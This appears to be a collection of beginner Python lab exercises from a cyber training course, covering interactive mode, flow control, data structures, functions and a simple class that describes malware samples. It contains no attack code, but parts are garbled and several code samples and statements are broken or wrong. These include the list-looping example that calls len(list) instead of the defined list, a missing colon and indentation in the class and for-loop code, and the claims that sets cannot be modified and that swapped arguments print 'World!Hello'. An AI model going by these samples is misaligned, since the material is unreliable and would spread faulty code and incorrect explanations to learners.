To get a list of available modules, keywords, symbols, or topics, type "modules", "keywords", "symbols", or "topics". Each module also comes with a one-line summary of what it does; to list the modules whose name or summary contain a given string such as "spam", type "modules spam".

The input line on the terminal is updated with help> to indicate that the help function interface is active. This interface allows queries for documentation stored within Python. 


2. Display any available documentation related the data type integer by entering the following command:
help> int



The displayed documentation includes the syntax, subclasses, methods, and data descriptors associated with the data type integer.


3. Exit the help documentation by entering q


Exiting the help documentation returns the terminal to the help function interface, as indicated by the help> at the beginning of the line.


4. Display documentation for the function print by entering the following command:
help> print



5. Exit the help documentation by entering q


6. Exit the help function and return to interactive mode by entering the following command:
help> q



Perform Operations with Python


Use Python’s interactive mode to complete operations and store the results in a variable. Continue working in Terminal, in the VM lin-hunt-cent.


Workflow


1. Within interactive mode, solve a simple equation by entering the following operation:
1 + 1



This outputs the value 2. Python is a useful development language for solving equations. In interactive mode, the output is returned instantly after entering the operation.


2. Solve an equation that requires multiple calculations by entering the following operation:
5 * (10 + 5)



This outputs the value 75. 


3. Create a variable x and define it as an equation by entering the following command:
x = 5 * (10 + 5)



This command indicates that the solution to the equation 5 * (10 + 5) is the value of variable x.


4. Display the value of variable x by entering the following command:
print(x)



Printing the variable x outputs 75. This confirms that the variable x holds the value of the equation 5 * (10 + 5). This variable only carries the value 75 while the current Python session in interactive mode is available. However, after terminating the current session, this data about variable x no longer exists. 


5. Define the variable y as a string value by entering the following command:
y = "Hello, World!"



Executing this command assigns the text Hello, World! as the value for variable y.


6. Perform string slicing on the variable y by entering the following command:
print(y[7:13])



This command prints a “slice” of the entire string value for variable y. The slice specified consists of characters 6 through 12. The command outputs the following:
World!



7. Store the value from the string slicing as a variable by entering the following command:
z = (y[7:13])



The command defines variable z as a string that is composed of characters 6 through 12 from the variable y. 

![image](https://github.com/user-attachments/assets/6c081a87-d113-4168-946c-2e4ce209bea1)


Program Flow Control
Specific Python syntax is available to enable developers to control code execution, its order, timing, and duration. These features are referred to as Python flow control. Common flow controls include code blocks, conditional statements, boolean logic, and loops. These are each detailed below. 

﻿

Code Blocks
﻿

A code block in Python is a piece of program text that is executed as a unit. An application consists of multiple blocks of code. This is similar to written essays that consist of multiple paragraphs. Code blocks are defined by indented formatting and new code blocks are established by creating new indent levels. 

﻿

Below is an example of two code blocks. The indent on the second line indicates that a code block has started from the previous line (line 1). The block continues by maintaining its indent level for two more lines, until the indent returns back to the original level. The second code block follows a similar format.

def code1(): 
	x = 3 #same block
	y = x + 6 #same block
	print(y) #same block
def code2():
	x = 10 #new block
	y = x + 6 #new block
	print(y) #new block
﻿

Conditional Statements
﻿

A conditional statement evaluates whether two values meet a specific condition. After an evaluation determines that the condition exists, the next line of code is executed. Python provides built-in functionality to implement conditional statements. The logical conditions supported by Python use the following syntax:

Equals: x == 7
Not Equals: x != y
Less than: x < y
Less than or equal to: x <= y
Greater than: x > y
Greater than or equal to: x >= y
﻿

The following code is an example of designing a Python conditional statement. The code starts by defining the variables x and y, then uses the operator if to initiate a conditional statement. The statement evaluates whether the variable x has a value less than the variable y. 

x = 10
y = 560
if x < y:
  print("x is less than y")
﻿

If this condition is true, the code prints the specific string of text defined in the example. If the condition is false, the command prompt does not return anything and, instead, returns the entry line to >>>. In the above example, the variable x has a value of 10. Since this is less than variable y, which has a value of 560, the statement is true. Executing this code returns the following output:

x is less than y
﻿

Boolean Logic
﻿

Boolean statements return either True or False. They are similar to conditional statements because both compare values of objects. Code that uses a Boolean statement executes based on the True or False logic the comparison returns. 

﻿

The following is an example of a Python conditional statement that uses Boolean logic. It uses the operators if and else to initiate the statement. Similar to the last example, the statement starts by evaluating whether the variable x is less than the variable y. If this is true, it prints the text "x is less than y". If the variable x is not less than the variable y, it prints the text "x is not less than y". 

x = 10
y = 560
if x < y:
  print("x is less than y")
else:
  print("x is not less than y")
﻿

Loops
﻿

Loops in programming languages allow users to repeatedly execute code for a defined number of intervals. Python supports for loops and while loops.

﻿

for Loops
﻿

A for loop uses the operator for to iterate on an object. In the example below, the code iterates through the range, printing each number until it reaches the value of x:

x = 4
for i in range(0, x):
  print(i)
﻿

When the variable i reaches the value of variable x, it stops printing. This is why this code only outputs up to the number 3:

0
1
2
3
﻿

while Loops
﻿

A while loop uses the operator while to execute a block of conditional statements until a specific condition is met. In the example below, the code executes until the variable x < 3 is no longer true. At the end of each loop, x increases by 1 and the new value for x is used in the next loop.

x = 0
while (x < 3):
  print("Loop")
  x += 1
﻿

The variable x loops until its value becomes 3. At that point, x is no longer less than 3, so the while loop stops printing. This code outputs Loop three times:

Loop
Loop
Loop


![image](https://github.com/user-attachments/assets/8fad30df-a260-497e-97e2-108e32ff9a36)



![image](https://github.com/user-attachments/assets/3e1611b4-61e9-4ae0-a26d-8d3acff788f4)


![image](https://github.com/user-attachments/assets/a570db6d-dba2-4acf-a986-df5064019bf0)


Python while Loop
The previous question asks about the following Python code:

x = 0
while (x < 5):   
     print("Loop")
	x += 1
﻿

The while statement in this code executes until the variable x < 5 is no longer true. After each code execution, 1 is added to the value of x before the loop continues. When x < 5 is no longer true, the code stops printing Loop. After the fifth iteration of the loop, x < 5 is no longer true, so the loop is exited. 

﻿

Executing the code returns the following output:
Loop
Loop
Loop
Loop
Loop



Initiate interactive mode running on the host by entering the following command:
python



4. Define two variables (a and b) by entering the following commands: 
a = 45
b = 21



5. Use the operator if to create a conditional statement that evaluates a and b by entering the following command:
if a > b:
...	  print("a is greater than b")



NOTE: To execute the command in step 5, an indent must be inserted prior to the print("a is greater than b") portion of the code and you must press Enter.


6. Select Enter.


The conditional statement proves true because 45 is greater than 21. This returns the following output:
a is greater than b

![image](https://github.com/user-attachments/assets/e418825b-2105-4a90-abc8-81bd46002cc6)




Workflow


1. In the current Terminal session, create a Boolean statement by entering the following operation:
if a < b:
  print("a is less than b")
else:
  print("a is not less than b")



This statement uses the operator if to evaluate whether variable a is less than variable b. If this condition is true, it prints the string a is less than b. If the condition is false, it prints the string a is not less than b. 


Since 45 is not less than 21, the condition in the statement is evaluated as false. Executing this operation returns the following output:
a is not less than b



Develop a for Loop


Use Python's interactive mode to develop a loop using the operator for. Continue working in the VM lin-hunt-cent.


Workflow


1. Open a new terminal session and access Python in interactive mode. 


2. Define a new value for variable x by entering the following command: 
x = 7



3. Define a range for the variable i with the operator for, by entering the following command:
for i in range(1,x):
  print(i) 



The for loop in the code executes until x, in the range(1,x) is reached. When the variable i reaches 7, the code stops printing. This outputs the following six digits for i:
1
2
3
4
5
6


Develop a while Loop


Use Python's interactive mode to develop a loop using the while operator. Continue working in the same Terminal session as the previous workflow, in the VM lin-hunt-cent.


Workflow


1. In the current Terminal session, create a while loop by entering the following operation:
counter = 0
while counter < 3:
  print("inside loop")
  counter += 1
else:
  print("outside loop")



The while loop in the code executes until the variable counter is no longer less than 3. For every loop completed, Python adds an integer value of 1 to the variable, and then continues the loop. When the variable counter is no longer less than 3, the loop completes the else command and ends the loop. 


The variable counter reaches a value that is no longer less than 3 after executing three times. Thereafter, the else statement is executed. This results in the following output:
inside loop
inside loop
inside loop
outside loop

![image](https://github.com/user-attachments/assets/0eb34cd4-ec9a-4203-9a2a-d8229e9a5754)



![image](https://github.com/user-attachments/assets/76f3e94c-ca46-4274-a995-3b21a5b4c404)



Python Data Structures
Python data structures organize data by type, which allows greater efficiency when accessing the data. The four basic Python data structures include the following:

Lists

Sets

Tuples

Dictionaries

﻿

Everything in Python is an object, including data structures. An object is "mutable" if its value can change. The object is "immutable" if its value cannot be changed. Whether or not an object's value can change helps determine the best use case for each type of data structure.

﻿

Lists
﻿

A list is an ordered collection of data. To create a Python list, place the items in square brackets and separate each item with commas. The following example defines the variable numbers as a list of numerals from 1 through 5 using this syntax:

numbers = [1, 2, 3, 4, 5]
﻿

Lists are mutable because items can be added and removed from the list at any time. However, the order of items in a list does not change. Items retain their order in the list, for as long as the list is available. The order uniquely defines each item in the list by an index starting at zero. In the following example, the item 3 can be removed, however the order still remains as per the original example from above:

numbers = [1, 2, 4, 5]
﻿
![image](https://github.com/user-attachments/assets/38387eb6-4a69-4d3a-b514-747c298bce2d)


Looping Lists


Python supports iterating over a list using for loops, while loops, and comprehensions. A for loop iterates over a list before performing a given action. A for loop completes a loop over each item in the list unless it is explicitly stopped. The following example uses the list numbers, from the previous example, and a for loop to print each item from the list:
# Looping Over a List in Python with a For Loop
numbers = [1, 2, 3, 4, 5]

for number in numbers:
    print(number)

#Output
1
2
3
4
5



A while loop continues to iterate until it meets a specified set of conditions. The following example uses the function len to return the length of the list. The while loop directs Python to continue to print i, as long as it is less than the length of the list. 
numbers = [1, 2, 3, 4, 5]

# Get length of list using len() function
length = len(list)
i = 0

while i < length:
    print(list[i])
    i += 1

#Output
1
2
3
4
5



Python comprehensions are a compact way of iterating over a list. The following example uses a comprehension to print out each item from the list numbers. A list comprehension only requires one line of code, and does not need a for or while loop to iterate over the list.  
# Using List Comprehensions to Iterate Over a List
numbers = [1, 2, 3, 4, 5]
[print(number) for number in numbers] 

#Output
1
2
3
4
5
[None, None, None, None, None]



Tuples


Python tuples are similar to Python lists. They are both built-in data structures for ordered collection of objects. However, tuples have more limited functionality than lists. Lists are mutable whereas tuples are immutable. Data that is not intended to be modified should be stored in tuples. This prevents accidental deletion or modification. 


Tuples are created by placing a sequence of values, separated by commas, in parentheses. The following example follows this syntax to define the variable tuple_1 as a tuple:
tuple_1 = ("blue", "green", "yellow", 10)



Python provides a powerful tuple feature that assigns the right-hand side of values to the left-hand side of values. This is referred to as "unpacking". Unpacking extracts tuple values and combines them into a single variable. The example x, y = (1, 2) uses tuple syntax to assign the values on the right side (1, 2) to each variable on the left side (x, y), based on the position of each value. This defines the variables as x = 1 and y = 2. 


Another way to use this feature is to assign each item in a tuple to a new variable. The following example assigns three values to the variable info. It then assigns three new variables to each tuple value in info by listing each new variable in order of its matching value. Printing each new variable displays the new assignments:
info = ("Kathy Simpson", "Marketing", "Senior")
(name, department, level) = info

print(name)
print(department)
print(level)

#Output
Kathy Simpson
Marketing
Senior 



Dictionaries


Python dictionaries have different traits, depending on the Python version in use. In Python 3.6 and earlier, a dictionary data structure is an unordered collection of data values that stores data in a key: value format. From Python version 3.7 and later, dictionaries are ordered collections. Similar to lists, dictionaries are mutable and dynamic, so they can grow or shrink as needed. Dictionary values are accessed through their keys, rather than by their positions.


A dictionary is defined by enclosing a comma-separated list of key: value pairs in curly braces {}, as follows:
dictionary = {
    key: value,
    key: value,
    key: value
}

![image](https://github.com/user-attachments/assets/f5b2df6d-3b19-43bb-81e2-d09fff52e281)



Python allows iterating through both the keys and values in a dictionary. The syntax for iterating is dictionary.items() where dictionary is the name of the dictionary to iterate through. This returns one key: value pair, at a time. The following example defines the dictionary dict, then defines the variable items with the iterating syntax. This iterates through the dictionary items when printed:
dict = {'name': 'Jeff', 'age': '25', 'address': 'New York'}
items = dict.items()
print(items)
dict_items([('name', 'Jeff'), ('age', '25'), ('address', 'New York')])

#Output
dict_items([('name', 'Jeff'), ('age', '25'), ('address', 'New York')])



Python also allows iterating through either just the keys or just the values in a dictionary, rather than iterating through pairs. Iterating through dictionary keys uses the syntax dictionary.keys() to return an object containing all the dictionary keys. Iterating through dictionary values uses the syntax dictionary.values() to return only the values in a Python dictionary. In the following example, the variable items1 is defined with the syntax to iterate through only the keys and the variable items2 is defined with the syntax to iterate through only the values:
dict = {'name': 'Jeff', 'age': '25', 'address': 'New York'}
items1 = dict.keys()
print(items1)
#Output
dict_keys(['name', 'age', 'address'])

#Using dictionary.values
items2 = dict.values()
print(items2)
#Output
dict_values(['Jeff', '25', 'New York']) 



Sets


A set is a unique collection of data that stores multiple items in a single variable. Sets are unordered, cannot be modified, and do not have indexes. A set is used when the existence of the data is more important than its order. Items may be added or removed in a set, but they cannot be modified. Items in a set must have unique values. The following is an example of a Python set with three items:
set_a = {"item 1", "item 2", "item 3",}



Python Multidimensional Arrays
An array is a vector that contains elements of the same data type. For example, an array may contain only characters, only integers, or only floating-point numbers. Arrays are different from lists because arrays need to be declared, while lists do not. Arrays are also preferred for storing large amounts of data because they are more compact and efficient. Additionally, arrays are inherently capable of numerical operations.

﻿

A type code is a single character that specifies the type of object an array stores when creating the object. In the Python Type column int stands for integer. The type float stands for floating-point numbers, which are numbers that include decimal points. Table 13.2-3, below, contains the type codes used by the Python module array.


 ![image](https://github.com/user-attachments/assets/4fe675ed-85c8-436d-bb1a-52644246d403)


The syntax for the Python module array is as follows:
import array
array.array(typecode[, initializer])

Multidimensional Lists and Arrays


Python supports multidimensional lists and arrays. A multidimensional object defines and stores data in a format with more than two dimensions. 


A multidimensional array is a two-dimensional array that has more than one row and column. To identify the position of an element in a multidimensional array, two indexes should be specified instead of only one. This can be done by fitting a list inside of another list, which is also known as a "nested" or multidimensional list. A multidimensional list takes the form of a basic list, such as List = [1, 2], but includes other lists as elements in the following way:
List = [[1, 2], [3, 4], [5, 6]]



A multidimensional array can be created by passing two or more lists of elements to the function. This type of array is created using the list class of Python, rather than the Python array class. The following example nests two list items within a single list to define the array:
array = [[1, 2, 3, 4], [5, 6, 7, 8]]

#Output
print(array)
[[1, 2, 3, 4], [5, 6, 7, 8]]
print(type(array))
<class 'list'>



Arrays in list format can also be developed in a two step process. First, each row is defined as a standalone list. Second, an array groups the rows together, in its own list. The example below follows this procedure by defining three rows, then implementing the array:
row1 = [0, 0, 0, 0, 0]
row2 = [0, 0, 0, 0, 0]
row3 = [0, 0, 0, 0, 0]

array = [row1, row2, row3]



The array can then be accessed with a for loop, as follows:
for row in array:
print (row)



Create Python Arrays


Use an interactive Python prompt to create multiple arrays, then access individual elements of each array.


Workflow


1. Log in to the Virtual Machine (VM) lin-hunt-cent using the following credentials:
Username: trainee
Password: CyberTraining1! 



2. Open a Linux terminal.


3. Launch an interactive python prompt with the following command:
python



4. Create a multidimensional array by placing values between the square brackets, using the following syntax:
array = []



5. Display the initialized empty array by entering the following:
print (array)

![image](https://github.com/user-attachments/assets/2809277c-2d57-4006-8df2-a0f51cd1b4e9)




6. Create Python lists by entering the following:
List = [1, 2, 3, 4]
List1 = [5, 6, 7, 8]
List2 = [9, 10, 11, 12]





7. Add the newly created lists to the array with the following syntax:
array = [List, List1, List2]



8. Iterate through the array with a for loop, as follows:
for list in array:
...	print(list)



9. Submit the enter key twice to return the output.


![image](https://github.com/user-attachments/assets/7ec38a4b-c1cd-4072-9e99-641f3e02c7a9)


10. Iterate through a specific list within the array by creating a for loop, as follows:
for list in array:
	print(List2)

11. Submit the enter key twice to return the output.
![image](https://github.com/user-attachments/assets/39afa535-1287-43e5-b1c9-0fb2b56b82dd)


12. Create rows in Python with the following code: 
row1 = [0, 0, 0, 0]
row2 = [0, 0, 0, 0]
row3 = [0, 0, 0, 0]



13. Create a new array made of the rows by entering the following:
array1 = [row1, row2, row3]



14. Use a for loop to iterate through array1.
for row in array1:
...     print (row)


![image](https://github.com/user-attachments/assets/0989640d-057f-4170-8ce1-ece37b68ff8d)



Create and Edit a Python Dictionary
The previous lab ran Python statements in an interactive prompt. This next lab creates a Python script using the Vim text editor, then executes the script from the shell command line. This lesson uses the following common commands for the Vim text editor:

Entering i enables insert mode, which allows text to be written to the file.

Using the escape key (esc) while in insert mode returns Vim to normal mode. 

Entering :wq in normal mode saves and exits the file.

﻿

Create a Python Dictionary
﻿

Create a dictionary from scratch and populate data into the dictionary. Then, execute the script to display the output. Use the common Vim commands listed above, as needed.

﻿3. Create the file dictionary.py in Vim by entering the following command:
vim dictionary.py



4. Display line numbers for Vim by entering the following command: 
:set number



5. Create a new dictionary by adding the following text on line 1:
new_dictionary = {}



6. Print the empty dictionary by entering the following text on line 3:
print(new_dictionary)

![image](https://github.com/user-attachments/assets/f133651a-7812-4a0c-a874-9b5e837be3f6)



The syntax print() prints the output from the command to the shell. The item to print is placed within the parentheses of the print() syntax. In step 6, the item in parentheses is the variable that was assigned for the dictionary. 


7. Print the type of data structure that was just created by entering the following text on line 5:
print (type(new_dictionary))



The code added to line 5 identifies the data structure used in the script, which is useful when the data structure is unknown. It is important to identify the correct data structure when working with Python because each data structure has a different use case.


8. Save the script and exit Vim by entering the following:
:wq



9. Execute the script by entering the following command:
python dictionary.py

Edit a Python Dictionary


Continue working in the Linux terminal using the VM lin-hunt-cent. Create a Python dictionary, then iterate through the dictionary to display its contents. Edit the Python script and append data to the existing dictionary.


Workflow


1. Create a new file, testresults.py in Vim by entering the following:
vim testresults.py



2. Create a dictionary named test_results and populate data into it by adding the following text on line 1:
test_results = {"Frank":"Passed", "Corey":"Passed", "Daniel":"Failed"}



3. Iterate through the dictionary and display only the values in its key:value pairs by adding the following text on lines 3 and 4:
for results in test_results.values():
		print(results)

![image](https://github.com/user-attachments/assets/1fcebc1a-f9c0-451b-8270-ab88be8ea678)




Displaying only the values in a dictionary is useful when the keys do not need to be displayed. The example above displays only the test results (values), and omits the names of those who took the test (keys).


4. Save the Python script and exit Vim by entering the following: 
:wq



5. Execute the script by entering the following command:
python testresults.py

![image](https://github.com/user-attachments/assets/f4910582-92b7-4cfb-a5a5-c0d397d80ccf)

6. Open the file testresults.py with Vim. 


7. Remove the code on lines 3 and 4.


8. Add an item to the dictionary by entering the following text on line 3:
test_results["Alexandra"] = "Failed" 

This method appends a new key:value pair to the existing dictionary.


9. Print the output when the script is executed by adding the following text on line 5:
print(test_results)

![image](https://github.com/user-attachments/assets/84977d1b-1103-4605-a553-350ace5b702e)


10. Save the Python script and exit Vim by entering the following:
:wq



11. Execute the script by entering the following command:
python testresults.py

![image](https://github.com/user-attachments/assets/3e759490-3806-4155-bbf6-137f64d21b33)


![image](https://github.com/user-attachments/assets/125580b7-eb74-4054-8339-fae598c8bf6a)



Create and Edit a Python List
Create a list and populate data into the list. Then, edit the list and add another item to it. 

﻿

Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:

Username: trainee
Password: CyberTraining1!

2. Open a Linux terminal.

﻿

3. Create the file grocerylist.py with Vim, by entering the following command:

vim grocerylist.py
﻿

4. Create a new list by adding the following text on lines 1 and 2:

groceries = ["apples", "milk", "chicken", "bread"]
prices = ["2.99", "3.60", "10.99", "3.10"]
﻿

5. Print the output of the script by entering the following text on lines 4 and 5:

print(groceries)
print(prices)

![image](https://github.com/user-attachments/assets/a57c216b-2482-471d-8bd6-7f501d857adf)


6. Save the Python script and exit Vim by entering the following:
:wq



7. Execute the script with the following command:
python grocerylist.py

![image](https://github.com/user-attachments/assets/ce882846-95df-4423-b5e8-bf198af7cc6a)




8. Open the file grocerylist.py with the Vim text editor.


9. Remove the print items on lines 4 and 5.


10. Add an item to the list groceries by entering the following text on line 3:
groceries.append("oranges")



The above code adds an item to the already existing list groceries. The syntax to append an item to an existing list is listname.appened("item"). It is also possible to add multiple items to a list using the following syntax:
listname.extend(["item1", "item2", "item3"])



11. Iterate through the list groceries and display the list in a more readable format by adding the following text on lines 5 and 6:
for number in groceries:
	print(number)



The code in step 11 uses a for loop to iterate over each item in the list. It uses the word number to make the code cleaner and easier to view.


![image](https://github.com/user-attachments/assets/d67444df-6696-4c0b-832f-71d0cd4c7dee)




12. Save the Python script and exit Vim by entering the following command:
:wq



13. Execute the Python script by entering the following command:
python grocerylist.py

![image](https://github.com/user-attachments/assets/07a06c3b-feb2-4ccd-8227-b17e8e1421f0)


![image](https://github.com/user-attachments/assets/b35fe028-3116-4539-b956-84670810940e)




2. Open a Linux terminal. 


3. Edit the Python file employeedata with Vim by entering the following:
vim employeedata.py



4. Create a dictionary named employees on line 1, by entering the following:
employees = {}



5. Add a list into the dictionary in the key:value format by entering the following text on lines 3 and 4:
employees["Name"] = ["Chuck", "Emily", "Max", "Laura"]
employees["Age"] = ["35", "25", "42", "55"]



The values step 5 uses for each key:value pair are entered as Python lists. Python allows lists for dictionary values, but not for dictionary keys.


6. Print the output by adding the correct print function on line 6:
print(employees)



7. Create a new list named new_employees by entering the following on line 5 (before the print function):
new_employees = ['Sam', 'Frank', 'Amy']



8. Append new_employees as a sublist of the dictionary by adding the following line between the new_employees list and the print function:
employees["Name"].append(new_employees)

![image](https://github.com/user-attachments/assets/eab64e49-983b-4d22-87f7-00e863577c57)

9. Execute the python script so that it outputs the following:
10. 
#Output
{'Name': ['Chuck', 'Emily', 'Max', 'Laura', ['Sam', 'Frank', 'Amy']], 'Age': ['35', '25', '42', '55']}


![image](https://github.com/user-attachments/assets/71fc7214-de06-47dc-a0e8-f9a8dc4d6509)


Test a Python Function
One trait Python shares with other high-level programming languages is that it has a defined syntax for constructing commands. Commands are constructed with components known as functions, similar to how a cooking recipe is made of different ingredients.  The functions allow Python to execute programs and reuse code. 

﻿

Python Function Overview
﻿

A Python function is a block of code that performs a certain action. The following is an example of the Python function print_text, which prints a statement that passes the string Hello World! to standard output:

def print_text():
  print("Hello World!")
﻿

In the function print_text, the keyword def is placed before the function name. Keywords are necessary for defining the function in Python.

﻿

Test a Python Function
﻿

Test the performance of a Python function within a script.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) lin-hunt-cent using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Open an empty text editor within Terminal by entering the following command:

[trainee@lin-hunt-cent ~]$ vim hello.py
﻿

4. Set the text editor to Insert mode by entering the letter i﻿

﻿

5. Enter the following function into the text editor:

def print_text():
  print("Hello World!")

print_text()
﻿

The function in step 5 is similar to the example from the previous section, but with one difference. Step five adds the command print_text() to the last line of the code to call the defined function during script execution.

﻿

6. Exit the text editor’s Insert mode by entering the ESC key.

﻿

7. Exit the text editor while saving changes to the script hello.py by entering the following command:

:wq
﻿

8. Run the Python script by executing the following command:

[trainee@lin-hunt-cent ~]$ python hello.py
﻿

The output is as follows:

Hello World!

﻿

This output indicates that the function print_text() correctly executed and printed the statically-defined text string to the screen. This is basic function performance. Upcoming labs in this lesson explore more complex functions that print different types of strings.

﻿

The next series of tasks in this lesson introduce the following additional components of Python functions:

Parameters
Arguments
passes an argument  and Parameters
Returning Values


 Parameters and Arguments
Parameters
﻿

The function in the previous lab is efficient for printing only the specific text string, Hello World!. This code has limited reusability because the text string printed by this function cannot be modified. This limits its use to only those occasions where printing Hello World! is valuable. One way to improve the reusability of this code is to have a variable define the string to be printed, rather than having the string hard-coded and contained within the function itself. The approach allows different string variables to be passed to the function and make the action of printing more dynamic. Such variables are known as parameters and they are included in the function definition.

﻿

The following revision to the function print_text replaces the string Hello World! with the parameter msg:

def print_text(msg):
  print(msg)
﻿

This revision makes the code more reusable since the string to print is no longer hard-coded into the function. Instead, the string is accepted as a parameter when the function print_text is called.

﻿

Since the value of the parameter msg is not defined in the function print_text, a value must be passed from elsewhere in the Python program or else this function results in an error. 

﻿

View a Parameter Error
﻿

Observe the error that results when the value of a parameter is missing.

﻿

Workflow
﻿

1. Enter the VM lin-hunt-cent. If necessary, enter the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Open the Python script hello.py in the text editor by entering the following command:

[trainee@lin-hunt-cent ~]$ vim hello.py
﻿

4. Set the text editor to Insert mode by entering the letter i﻿

﻿

5. Modify the function print_text() by replacing the string Hello World! with the parameter msg, as follows:

def print_text(msg):
  print(msg)

print_text()
﻿

6. Exit the text editor’s Insert mode by entering the ESC key.

﻿

7. Exit the text editor while saving changes to the script hello.py by entering the following command:

:wq
﻿

8. Run the Python script by executing the following command:

[trainee@lin-hunt-cent ~]$ python hello.py
﻿

Executing this Python script outputs the following error:

TypeError: print_text() missing 1 positional argument: 'msg'
﻿

The modified function print_text has a new definition which includes the parameter msg. This is why the error from executing this script reports that the function call print_text() is missing one positional argument. In order to satisfy the required msg parameter in the function definition, an argument must be passed within the function call print_text.

﻿

Arguments
﻿

Passing an argument into a function occurs when a previously defined variable name is included within a previously defined function call. In the following script, the first line defines the variable myMsg as Hello World!. The second line is a function call that consists of the name of the previously defined function print_text along with the newly defined variable myMsg.

myMsg = "Hello World!"
print_text(myMsg)
﻿

![image](https://github.com/user-attachments/assets/e500baf8-cf5e-44ed-a356-6875db8e74a9)



In this instance, the result of the above function call is Hello World!﻿

﻿

After providing the variable definition and argument in the function call, executing the function no longer produces an error. 

﻿

Pass an Argument into a Function
﻿

Continue working in Terminal, in the VM lin-hunt-cent, to modify the script hello.py so that it successfully executes a function that includes an argument.

﻿

Workflow
﻿

1. In Terminal, open the Python script hello.py in the text editor by entering the following command:

[trainee@lin-hunt-cent ~]$ vim hello.py
﻿

2. Set the text editor to Insert mode by entering the letter i﻿

﻿

3. Modify the function print_text() by defining the variable myMsg and adding an argument so that the function is written as follows:

def print_text(msg):
    print(msg)

myMsg = "Hello World!"
print_text(myMsg)
﻿

4. Exit the text editor’s Insert mode by entering the ESC key.

﻿

5. Exit the text editor while saving changes to the script hello.py by entering the following command:

:wq
﻿

6. Run the Python script by executing the following command:

[trainee@lin-hunt-cent ~]$ python hello.py
﻿

Executing this Python script outputs the following:

Hello World!
﻿

After the argument myMsg is passed along with the function call print_text, the script  execute s without the error seen in the previous lab. This function is also now more reusable since it will print any text string passed to it a s an arg ument. The value of the variable myMsg can be changed to any text string and passed to print_text for printing to the sc reen.


argument to a function and Parameters
A function call can include multiple parameters that make the function more dynamic. In the following example, the function new_print_text calls two parameters, string1 and string2, to be used with a print command:



![image](https://github.com/user-attachments/assets/6a17e6ef-2fe3-4fed-ad1c-b9da9158ee36)


def new_print_text(string1,string2):
  print(string1,string2)
﻿

The function new_print_text can be used with a couple of variable definitions followed by a function call, as follows:

myMsg1 = "Hello "
myMsg2 = "World!"

new_print_text(myMsg1,myMsg2)
﻿

Executing this function call prints the combined string Hello World!, just as in the previous examples in this lesson. However, changing the sequence of these two arguments so that the variable myMsg2 is listed first provides a different output. Instead of Hello World!, the resulting combined string prints World!Hello. This is an example of positional arguments, where arguments and parameters are linked according to the order in which they are provided.

﻿

In contrast to positional arguments, keyword arguments explicitly define the argument value that corresponds to a function parameter. The following function call prints the string Hello World! because the function parameters are used as keywords that are assigned specific values:

myMsg1 = "Hello "
myMsg2 = "World!"

new_print_text(string2=myMsg2, string1=myMsg1)
﻿

When using keyword arguments, a variable name can be used as shown or a specific value can be given, such as (string2="World!", string1="Hello").




Similar to keyword arguments, function parameters explicitly define default values when a given argument is not provided. The following function call produces an error because the function new_print_text expects two arguments, while the example below only lists one:

new_print_text(string2=myMsg2)
﻿

A solution to resolve this error is to use a default value. In the following example, the parameter string1 has been set to a default value of This Is My. When the previous function call is made with only string2 defined, this setting prints This Is My World! instead of resulting in an error. 

def new_print_text(string2, string1="This Is My"):
  print(string1,string2)
﻿

Defining a default value for a parameter is useful for correctly executing a function that requires a non-empty value. All default arguments must follow non-default arguments, as in the previous example, otherwise an error results.

﻿

The previously defined functions work well for printing one or two string values. However, code reusability can be improved by adding the ability to print a variable number of string values. For instance, if the string Hello World! We are coding! were to be printed using the function above, it would have to be passed as one string or broken into two strings. Yet, if there was a need to collect multiple single-word strings and combine them into a single string output, there would need to be a function definition that allows up to five parameters. Twenty or one thousand single-word strings would be more complex.

﻿

To allow for a more feasible function definition, a single parameter can be defined with *args. This allows for a variable number of arguments to be passed to the function when called. In the following example of a new function definition, *args is set as the only function parameter which accepts a variable-length argument:

def variable_print_text(*args):
  for i in args:
    print(i)

variable_print_text("Hello","World!","We","are","coding!")
﻿

When the last line of code in this function is called, the function recognizes an argument length of five and iterates through each to print to the screen the phrase Hello World! We are coding!﻿

﻿

Pass Passing an argument into a function into a Function
﻿



Modify the script hello.py so that it successfully executes a function that accepts a variable number of arguments. Continue working in Terminal, in the VM lin-hunt-cent.

﻿

Workflow
﻿

1. In Terminal, open the script hello.py in the text editor by entering the following command:

[trainee@lin-hunt-cent ~]$ vim hello.py
﻿

2. Set the text editor to Insert mode by entering the letter i﻿

﻿

3. Edit hello.py to include the following code:

def variable_print_text(*args):
  for i in args:
    print(i)

variable_print_text("Hello","World!","We","are","coding!")
﻿

4. Exit the text editor’s Insert mode by entering the ESC key.

﻿

5. Exit the text editor while saving changes to the script hello.py by entering the following command:

:wq
﻿

6. Run the Python script by executing the following command:

[trainee@lin-hunt-cent ~]$ python hello.py
﻿

Executing the script prints the following:

Hello
World!
We
are
coding!
﻿

The script output shows that each of the arguments passed to the function variable_print_text was successfully printed to the screen, in the order by which it was passed. This indica tes that  the use of *args as a function parameter was successful at accepting multiple argumen ts witho ut the need to explicitly define a separate parameter for each possible ar gument.



![image](https://github.com/user-attachments/assets/1a85cf06-765c-4903-9bce-f86796608f52)




Class Layout and Characteristics


The previous Python code examples in this lesson used variables and methods to manipulate data and program output. Another valuable tool is the Python class, which can be thought of as a mold for creating objects. Just as a mold shapes various types of materials, a single Python class can create various objects that share common attributes. 

﻿

The following lines of code illustrate the usefulness of Python classes. The first line defines the class without using the keyword def. This is followed by an object constructor __init__, which initializes a newly created object state. Since this Python class is concerned with malware, assume that each object of this class is a certain kind of malware (virus, trojan, worm, etc.) and the instance variables help define the object in relation to the class.

﻿

class Malware:

  # Constructor
  def __init__(self,name,mtype,tlevel)

    # Instance variables
    self.name = name
    self.mtype = mtype
    self.tlevel = tlevel

  # Class attributes
  attr1 = "has a malware signature"
  attr2 = "has been analyzed"

  # Class method
  def define(self):
    print(self.name, self.attr1)
    print(self.name, self.attr2)
    print("Refer to documentation for", self.name)
﻿

The instance variables are name, mtype (malware type), and tlevel (threat level). These instance variables have values provided as attributes to the constructor when a class object is instantiated, such as with the following line of code:

malware1 = Malware("Cryptolocker","trojan","high")
﻿

Instantiating an object in Python is similar to calling a method. The difference is that a class creates an object and assigns attributes to that object, while a method simply performs some action. In addition to instance variables that are specific to certain objects, there are also class attributes that are shared by each object of a class. In the example above, each object that is a member of the class Malware shares two attributes, regardless of the values of the instance variables.

﻿

